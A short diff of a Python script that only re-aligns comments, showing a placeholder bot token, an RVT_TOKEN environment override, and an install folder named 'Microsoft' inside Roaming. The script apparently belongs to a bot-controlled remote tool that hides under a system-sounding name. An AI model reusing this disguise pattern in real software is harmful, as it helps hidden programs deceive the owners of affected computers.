@@ -62,8 +62,8 @@ except:
 cd.log('i','Starting')
 me = singleton.SingleInstance()
 
-token = 'xx:xx'                                                 # <== Aquí debes ingresar el codigo único de tu Bot
-if 'RVT_TOKEN' in os.environ:                                   # it can also be set as an environment variable
+token = 'xx:xx'                     # <== Aquí debes ingresar el codigo único de tu Bot
+if 'RVT_TOKEN' in os.environ:       # it can also be set as an environment variable
     token = os.environ['RVT_TOKEN']
     
 app_name = 'Microsoft'                                          # Nombre de la carpeta en dentro delRoaming
